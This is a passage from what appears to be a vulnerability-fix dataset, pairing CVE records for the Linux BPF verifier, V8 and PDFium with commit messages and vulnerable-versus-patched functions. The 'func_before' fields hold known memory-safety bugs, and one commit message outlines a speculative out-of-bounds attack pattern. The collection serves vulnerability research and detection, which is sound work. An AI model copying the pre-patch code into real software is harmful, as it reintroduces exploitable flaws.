port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static int copy_verifier_state(struct bpf_verifier_state *dst_state,\n\t\t\t       const struct bpf_verifier_state *src)\n{\n\tstruct bpf_func_state *dst;\n\tint i, err;\n\n\t/* if dst has more stack frames then src frame, free them */\n\tfor (i = src->curframe + 1; i <= dst_state->curframe; i++) {\n\t\tfree_func_state(dst_state->frame[i]);\n\t\tdst_state->frame[i] = NULL;\n\t}\n\tdst_state->curframe = src->curframe;\n\tfor (i = 0; i <= src->curframe; i++) {\n\t\tdst = dst_state->frame[i];\n\t\tif (!dst) {\n\t\t\tdst = kzalloc(sizeof(*dst), GFP_KERNEL);\n\t\t\tif (!dst)\n\t\t\t\treturn -ENOMEM;\n\t\t\tdst_state->frame[i] = dst;\n\t\t}\n\t\terr = copy_func_state(dst, src->frame[i]);\n\t\tif (err)\n\t\t\treturn err;\n\t}\n\treturn 0;\n}",
        "func": "static int copy_verifier_state(struct bpf_verifier_state *dst_state,\n\t\t\t       const struct bpf_verifier_state *src)\n{\n\tstruct bpf_func_state *dst;\n\tint i, err;\n\n\t/* if dst has more stack frames then src frame, free them */\n\tfor (i = src->curframe + 1; i <= dst_state->curframe; i++) {\n\t\tfree_func_state(dst_state->frame[i]);\n\t\tdst_state->frame[i] = NULL;\n\t}\n\tdst_state->speculative = src->speculative;\n\tdst_state->curframe = src->curframe;\n\tfor (i = 0; i <= src->curframe; i++) {\n\t\tdst = dst_state->frame[i];\n\t\tif (!dst) {\n\t\t\tdst = kzalloc(sizeof(*dst), GFP_KERNEL);\n\t\t\tif (!dst)\n\t\t\t\treturn -ENOMEM;\n\t\t\tdst_state->frame[i] = dst;\n\t\t}\n\t\terr = copy_func_state(dst, src->frame[i]);\n\t\tif (err)\n\t\t\treturn err;\n\t}\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,6 +9,7 @@\n \t\tfree_func_state(dst_state->frame[i]);\n \t\tdst_state->frame[i] = NULL;\n \t}\n+\tdst_state->speculative = src->speculative;\n \tdst_state->curframe = src->curframe;\n \tfor (i = 0; i <= src->curframe; i++) {\n \t\tdst = dst_state->frame[i];",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tdst_state->speculative = src->speculative;"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/states_equal",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static bool states_equal(struct bpf_verifier_env *env,\n\t\t\t struct bpf_verifier_state *old,\n\t\t\t struct bpf_verifier_state *cur)\n{\n\tint i;\n\n\tif (old->curframe != cur->curframe)\n\t\treturn false;\n\n\t/* for states to be equal callsites have to be the same\n\t * and all frame states need to be equivalent\n\t */\n\tfor (i = 0; i <= old->curframe; i++) {\n\t\tif (old->frame[i]->callsite != cur->frame[i]->callsite)\n\t\t\treturn false;\n\t\tif (!func_states_equal(old->frame[i], cur->frame[i]))\n\t\t\treturn false;\n\t}\n\treturn true;\n}",
        "func": "static bool states_equal(struct bpf_verifier_env *env,\n\t\t\t struct bpf_verifier_state *old,\n\t\t\t struct bpf_verifier_state *cur)\n{\n\tint i;\n\n\tif (old->curframe != cur->curframe)\n\t\treturn false;\n\n\t/* Verification state from speculative execution simulation\n\t * must never prune a non-speculative execution one.\n\t */\n\tif (old->speculative && !cur->speculative)\n\t\treturn false;\n\n\t/* for states to be equal callsites have to be the same\n\t * and all frame states need to be equivalent\n\t */\n\tfor (i = 0; i <= old->curframe; i++) {\n\t\tif (old->frame[i]->callsite != cur->frame[i]->callsite)\n\t\t\treturn false;\n\t\tif (!func_states_equal(old->frame[i], cur->frame[i]))\n\t\t\treturn false;\n\t}\n\treturn true;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,6 +5,12 @@\n \tint i;\n \n \tif (old->curframe != cur->curframe)\n+\t\treturn false;\n+\n+\t/* Verification state from speculative execution simulation\n+\t * must never prune a non-speculative execution one.\n+\t */\n+\tif (old->speculative && !cur->speculative)\n \t\treturn false;\n \n \t/* for states to be equal callsites have to be the same",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\treturn false;",
                "",
                "\t/* Verification state from speculative execution simulation",
                "\t * must never prune a non-speculative execution one.",
                "\t */",
                "\tif (old->speculative && !cur->speculative)"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-7927",
        "func_name": "chromium/SimplifiedLowering::DoLoadBuffer",
        "description": "The SimplifiedLowering::DoLoadBuffer function in compiler/simplified-lowering.cc in Google V8, as used in Google Chrome before 40.0.2214.91, does not properly choose an integer data type, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted JavaScript code.",
        "git_url": "https://chromium.googlesource.com/v8/v8/+/3f00ce2d5933c29660d179e3a7060191fd1a59cd",
        "commit_title": "[turbofan] Fix missing ChangeUint32ToUint64 in lowering of LoadBuffer.",
        "commit_text": "   ",
        "func_before": "void SimplifiedLowering::DoLoadBuffer(Node* node, MachineType output_type,\n                                      RepresentationChanger* changer) {\n  DCHECK_EQ(IrOpcode::kLoadBuffer, node->opcode());\n  DCHECK_NE(kMachNone, RepresentationOf(output_type));\n  MachineType const type = BufferAccessOf(node->op()).machine_type();\n  if (output_type != type) {\n    Node* const buffer = node->InputAt(0);\n    Node* const offset = node->InputAt(1);\n    Node* const length = node->InputAt(2);\n    Node* const effect = node->InputAt(3);\n    Node* const control = node->InputAt(4);\n\n    Node* check = graph()->NewNode(machine()->Uint32LessThan(), offset, length);\n    Node* branch =\n        graph()->NewNode(common()->Branch(BranchHint::kTrue), check, control);\n\n    Node* if_true = graph()->NewNode(common()->IfTrue(), branch);\n    Node* etrue = graph()->NewNode(machine()->Load(type), buffer, offset,\n                                   effect, if_true);\n    Node* vtrue = changer->GetRepresentationFor(etrue, type, output_type);\n\n    Node* if_false = graph()->NewNode(common()->IfFalse(), branch);\n    Node* efalse = effect;\n    Node* vfalse;\n    if (output_type & kRepTagged) {\n      vfalse = jsgraph()->UndefinedConstant();\n    } else if (output_type & kRepFloat64) {\n      vfalse =\n          jsgraph()->Float64Constant(std::numeric_limits<double>::quiet_NaN());\n    } else if (output_type & kRepFloat32) {\n      vfalse =\n          jsgraph()->Float32Constant(std::numeric_limits<float>::quiet_NaN());\n    } else {\n      vfalse = jsgraph()->Int32Constant(0);\n    }\n\n    Node* merge = graph()->NewNode(common()->Merge(2), if_true, if_false);\n    Node* ephi = graph()->NewNode(common()->EffectPhi(2), etrue, efalse, merge);\n\n    // Replace effect uses of {node} with the {ephi}.\n    NodeProperties::ReplaceWithValue(node, node, ephi);\n\n    // Turn the {node} into a Phi.\n    node->set_op(common()->Phi(output_type, 2));\n    node->ReplaceInput(0, vtrue);\n    node->ReplaceInput(1, vfalse);\n    node->ReplaceInput(2, merge);\n    node->TrimInputCount(3);\n  } else {\n    node->set_op(machine()->CheckedLoad(type));\n  }\n}",
        "func": "void SimplifiedLowering::DoLoadBuffer(Node* node, MachineType output_type,\n                                      RepresentationChanger* changer) {\n  DCHECK_EQ(IrOpcode::kLoadBuffer, node->opcode());\n  DCHECK_NE(kMachNone, RepresentationOf(output_type));\n  MachineType const type = BufferAccessOf(node->op()).machine_type();\n  if (output_type != type) {\n    Node* const buffer = node->InputAt(0);\n    Node* const offset = node->InputAt(1);\n    Node* const length = node->InputAt(2);\n    Node* const effect = node->InputAt(3);\n    Node* const control = node->InputAt(4);\n    Node* const index =\n        machine()->Is64()\n            ? graph()->NewNode(machine()->ChangeUint32ToUint64(), offset)\n            : offset;\n\n    Node* check = graph()->NewNode(machine()->Uint32LessThan(), offset, length);\n    Node* branch =\n        graph()->NewNode(common()->Branch(BranchHint::kTrue), check, control);\n\n    Node* if_true = graph()->NewNode(common()->IfTrue(), branch);\n    Node* etrue =\n        graph()->NewNode(machine()->Load(type), buffer, index, effect, if_true);\n    Node* vtrue = changer->GetRepresentationFor(etrue, type, output_type);\n\n    Node* if_false = graph()->NewNode(common()->IfFalse(), branch);\n    Node* efalse = effect;\n    Node* vfalse;\n    if (output_type & kRepTagged) {\n      vfalse = jsgraph()->UndefinedConstant();\n    } else if (output_type & kRepFloat64) {\n      vfalse =\n          jsgraph()->Float64Constant(std::numeric_limits<double>::quiet_NaN());\n    } else if (output_type & kRepFloat32) {\n      vfalse =\n          jsgraph()->Float32Constant(std::numeric_limits<float>::quiet_NaN());\n    } else {\n      vfalse = jsgraph()->Int32Constant(0);\n    }\n\n    Node* merge = graph()->NewNode(common()->Merge(2), if_true, if_false);\n    Node* ephi = graph()->NewNode(common()->EffectPhi(2), etrue, efalse, merge);\n\n    // Replace effect uses of {node} with the {ephi}.\n    NodeProperties::ReplaceWithValue(node, node, ephi);\n\n    // Turn the {node} into a Phi.\n    node->set_op(common()->Phi(output_type, 2));\n    node->ReplaceInput(0, vtrue);\n    node->ReplaceInput(1, vfalse);\n    node->ReplaceInput(2, merge);\n    node->TrimInputCount(3);\n  } else {\n    node->set_op(machine()->CheckedLoad(type));\n  }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,14 +9,18 @@\n     Node* const length = node->InputAt(2);\n     Node* const effect = node->InputAt(3);\n     Node* const control = node->InputAt(4);\n+    Node* const index =\n+        machine()->Is64()\n+            ? graph()->NewNode(machine()->ChangeUint32ToUint64(), offset)\n+            : offset;\n \n     Node* check = graph()->NewNode(machine()->Uint32LessThan(), offset, length);\n     Node* branch =\n         graph()->NewNode(common()->Branch(BranchHint::kTrue), check, control);\n \n     Node* if_true = graph()->NewNode(common()->IfTrue(), branch);\n-    Node* etrue = graph()->NewNode(machine()->Load(type), buffer, offset,\n-                                   effect, if_true);\n+    Node* etrue =\n+        graph()->NewNode(machine()->Load(type), buffer, index, effect, if_true);\n     Node* vtrue = changer->GetRepresentationFor(etrue, type, output_type);\n \n     Node* if_false = graph()->NewNode(common()->IfFalse(), branch);",
        "diff_line_info": {
            "deleted_lines": [
                "    Node* etrue = graph()->NewNode(machine()->Load(type), buffer, offset,",
                "                                   effect, if_true);"
            ],
            "added_lines": [
                "    Node* const index =",
                "        machine()->Is64()",
                "            ? graph()->NewNode(machine()->ChangeUint32ToUint64(), offset)",
                "            : offset;",
                "    Node* etrue =",
                "        graph()->NewNode(machine()->Load(type), buffer, index, effect, if_true);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1359",
        "func_name": "pdfium/_CharsetFromOrdering",
        "description": "Multiple off-by-one errors in fpdfapi/fpdf_font/font_int.h in PDFium, as used in Google Chrome before 40.0.2214.91, allow remote attackers to cause a denial of service (buffer overflow) or possibly have unspecified other impact via a crafted PDF document, related to an \"intra-object-overflow\" issue, a different vulnerability than CVE-2015-1205.",
        "git_url": "https://pdfium.googlesource.com/pdfium/+/9dd088033537c071725b9a61fd5b519d65ea9f13",
        "commit_title": "Fix off-by-one in sizing of m_EmbeddedToUnicodes.",
        "commit_text": "  ",
        "func_before": "int _CharsetFromOrdering(const CFX_ByteString& Ordering)\n{\n    int charset = 1;\n    while (g_CharsetNames[charset] && Ordering != CFX_ByteStringC(g_CharsetNames[charset])) {\n        charset ++;\n    }\n    if (g_CharsetNames[charset] == NULL) {\n        return CIDSET_UNKNOWN;\n    }\n    return charset;\n}",
        "func": "int _CharsetFromOrdering(const CFX_ByteString& Ordering)\n{\n\tfor (int charset = 1; charset < NUMBER_OF_CIDSETS; charset++) {\n\t\tif (Ordering == CFX_ByteStringC(g_CharsetNames[charset]))\n\t\t\treturn charset;\n\t}\n\treturn CIDSET_UNKNOWN;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,11 +1,8 @@\n int _CharsetFromOrdering(const CFX_ByteString& Ordering)\n {\n-    int charset = 1;\n-    while (g_CharsetNames[charset] && Ordering != CFX_ByteStringC(g_CharsetNames[charset])) {\n-        charset ++;\n-    }\n-    if (g_CharsetNames[charset] == NULL) {\n-        return CIDSET_UNKNOWN;\n-    }\n-    return charset;\n+\tfor (int charset = 1; charset < NUMBER_OF_CIDSETS; charset++) {\n+\t\tif (Ordering == CFX_ByteStringC(g_CharsetNames[charset]))\n+\t\t\treturn charset;\n+\t}\n+\treturn CIDSET_UNKNOWN;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    int charset = 1;",
                "    while (g_CharsetNames[charset] && Ordering != CFX_ByteStringC(g_CharsetNames[charset])) {",
                "        charset ++;",
                "    }",
